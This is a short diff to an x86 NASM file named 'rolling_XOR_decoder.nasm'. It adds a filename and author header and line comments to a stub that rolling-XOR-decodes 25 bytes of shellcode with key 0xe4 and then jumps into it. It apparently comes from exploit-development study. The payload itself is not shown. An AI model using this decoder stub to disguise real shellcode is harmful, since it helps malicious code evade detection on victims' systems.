@@ -1,4 +1,5 @@
-
+; Filename: rolling_XOR_decoder.nasm
+; Author: wfscs3
 
 global _start
 
@@ -10,19 +11,19 @@ _start:
 
 decoder:
 
-	pop esi			
-	mov cl, 25 		; Insert counter for shell length
+	pop esi			; save pointer		
+	mov cl, 25 		; Insert counter (shellcode length).
 	xor eax, eax	 
-	mov al, 0xe4	; Insert Random XOR Key
+	mov al, 0xe4	; Insert Random XOR Key from script.
 	xor edx, edx
 
 decode:
 
-	mov dl, [esi]
-	xor al, dl
-	mov [esi], al
-	mov al, dl
-	inc esi
+	mov dl, [esi]	; load pointer
+	xor al, dl		; xor random key and first byte
+	mov [esi], al	; change value
+	mov al, dl		; rolling XOR
+	inc esi			; next byte
 	loop decode
 	jmp short shellcode
 
